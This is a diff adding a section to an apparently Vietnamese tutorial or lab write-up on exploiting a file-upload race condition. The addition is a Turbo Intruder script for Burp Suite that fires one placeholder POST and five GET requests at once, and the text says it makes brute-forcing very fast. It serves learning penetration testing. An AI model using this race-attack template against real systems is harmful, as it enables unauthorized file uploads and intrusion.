@@ -42,5 +42,33 @@ Nếu bạn muốn không muốn bấm tay thì bạn có thể viết code ho�
 
 ![image](https://github.com/user-attachments/assets/9170d43e-508d-41dd-a2b8-2b3bcea10039)
 
+Nếu bạn muốn viết code thì đây.
+
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+    request1 = '''<YOUR-POST-REQUEST>'''
+
+    request2 = '''<YOUR-GET-REQUEST>'''
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+
+    # wait until every 'race1' tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate('race1')
+
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+Code này là code để bạn send vào `turbo intruder`, 1 extension của burpsuite bạn phải cài vào, nó khác với intruder thường là bạn có thể thay đổi được connection, thread,... khiến tốc độ bruteforce rất nhanh.
 ### REFERENCES
 [1]. https://sec.vnpt.vn/2023/05/exploiting-file-upload-vulnerability-with-race-conditions-challenge-for-you/
